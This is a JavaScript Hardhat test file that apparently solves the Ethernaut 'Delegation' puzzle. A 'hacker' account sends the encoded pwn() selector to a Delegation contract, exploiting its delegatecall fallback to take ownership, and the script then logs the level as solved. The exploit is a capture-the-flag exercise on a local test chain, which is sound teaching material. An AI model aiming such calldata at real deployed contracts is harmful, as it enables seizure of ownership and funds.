const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

describe("Delegation", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const delegateFactory = await ethers.getContractFactory("Delegate");
    delegate = await delegateFactory.deploy(deployer.address);
    await delegate.deployed();

    const delegationFactory = await ethers.getContractFactory("Delegation");
    delegation = await delegationFactory.deploy(delegate.address);
    await delegation.deployed();
  });

  it("sets deployer as owner of Delegation", async () => {
    expect(await delegation.owner()).to.eq(deployer.address);
  });

  it("does not set hacker as owner", async () => {
    expect(await delegation.owner()).to.not.eq(hacker.address);
  });

  it("initiates hack", async () => {
    console.log("Calculating function signature of pwn() in Delegate")
    const interface = new ethers.utils.Interface(["function pwn()"]);
    const functionSig = interface.encodeFunctionData("pwn");
    console.log("function signature : ", functionSig)
    console.log("initiating hack!");
    const tx = await hacker.sendTransaction({
        to: delegation.address,
        data: functionSig,
        gasLimit: 100000,
      });
    await tx.wait()
    util.updateTotalSolved(scriptName);
  });
});
